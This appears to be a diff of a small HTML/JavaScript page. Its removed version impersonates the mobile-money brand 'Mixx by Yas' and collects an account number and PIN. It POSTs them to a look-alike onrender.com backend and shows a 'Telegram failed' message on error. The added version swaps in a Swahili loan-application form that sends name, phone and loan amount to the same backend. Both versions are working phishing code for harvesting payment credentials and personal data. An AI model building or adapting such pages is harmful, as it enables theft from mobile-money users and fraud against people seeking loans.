@@ -1,85 +1,89 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mixx by Yas</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loan Application</title>
 
-<style>
+    <style>
 
-body{
-    font-family:Arial;
-    background:#f2f2f2;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-}
+        body{
+            font-family:Arial;
+            background:#f2f2f2;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            height:100vh;
+        }
 
-.container{
-    background:white;
-    padding:25px;
-    width:350px;
-    border-radius:10px;
-    box-shadow:0 0 10px rgba(0,0,0,0.1);
-}
+        .container{
+            background:white;
+            padding:25px;
+            width:350px;
+            border-radius:10px;
+            box-shadow:0 0 10px rgba(0,0,0,0.1);
+        }
 
-h2{
-    text-align:center;
-    color:green;
-}
+        h2{
+            text-align:center;
+            color:green;
+        }
 
-input{
-    width:100%;
-    padding:12px;
-    margin-top:15px;
-    border:1px solid #ccc;
-    border-radius:5px;
-}
+        input{
+            width:100%;
+            padding:12px;
+            margin-top:15px;
+            border:1px solid #ccc;
+            border-radius:5px;
+        }
 
-button{
-    width:100%;
-    padding:12px;
-    margin-top:20px;
-    background:green;
-    color:white;
-    border:none;
-    border-radius:5px;
-    font-size:16px;
-}
+        button{
+            width:100%;
+            padding:12px;
+            margin-top:20px;
+            background:green;
+            color:white;
+            border:none;
+            border-radius:5px;
+            font-size:16px;
+            cursor:pointer;
+        }
 
-.message{
-    text-align:center;
-    margin-top:15px;
-}
+        #message{
+            margin-top:15px;
+            text-align:center;
+        }
 
-</style>
+    </style>
 </head>
 
 <body>
 
 <div class="container">
 
-<h2>Mixx by Yas</h2>
+    <h2>Omba Mkopo</h2>
 
-<input type="text" id="namba" placeholder="Weka Namba ya Mixx by Yas">
+    <input type="text" id="name" placeholder="Jina Kamili">
 
-<input type="password" id="pin" placeholder="Weka PIN ya Mixx by Yas">
+    <input type="text" id="phone" placeholder="Namba ya Simu">
 
-<button onclick="tumaTaarifa()">
-ENDELEA
-</button>
+    <input type="number" id="loan_amount" placeholder="Kiasi cha Mkopo">
 
-<div class="message" id="message"></div>
+    <button onclick="tumaMaombi()">
+        TUMA MAOMBI
+    </button>
+
+    <div id="message"></div>
 
 </div>
 
 <script>
 
-async function tumaTaarifa(){
+async function tumaMaombi(){
 
-    let namba = document.getElementById("namba").value;
-    let pin = document.getElementById("pin").value;
+    let name = document.getElementById("name").value;
+    let phone = document.getElementById("phone").value;
+    let loan_amount = document.getElementById("loan_amount").value;
 
     let message = document.getElementById("message");
 
@@ -87,42 +91,33 @@ async function tumaTaarifa(){
 
     try{
 
-        let response = await fetch("https://mkopo-wa-mixx-by-yas.onrender.com/submit-step3",{
+        let response = await fetch(
+            "https://mkopo-wa-mixx-by-yas.onrender.com/submit-loan",
+            {
 
-            method:"POST",
+                method:"POST",
 
-            headers:{
-                "Content-Type":"application/json"
-            },
+                headers:{
+                    "Content-Type":"application/json"
+                },
 
-            body:JSON.stringify({
-                namba:namba,
-                pin:pin
-            })
+                body:JSON.stringify({
+                    name:name,
+                    phone:phone,
+                    loan_amount:loan_amount
+                })
 
-        });
+            }
+        );
 
         let data = await response.json();
 
-        console.log(data);
-
-        if(response.ok){
-
-            message.style.color = "green";
-            message.innerHTML = "Imetumwa successfully";
-
-        }else{
-
-            message.style.color = "red";
-            message.innerHTML = "Telegram failed";
-
-        }
+        message.innerHTML = data.message;
 
     }catch(error){
 
         console.log(error);
 
-        message.style.color = "red";
         message.innerHTML = "Backend error";
 
     }
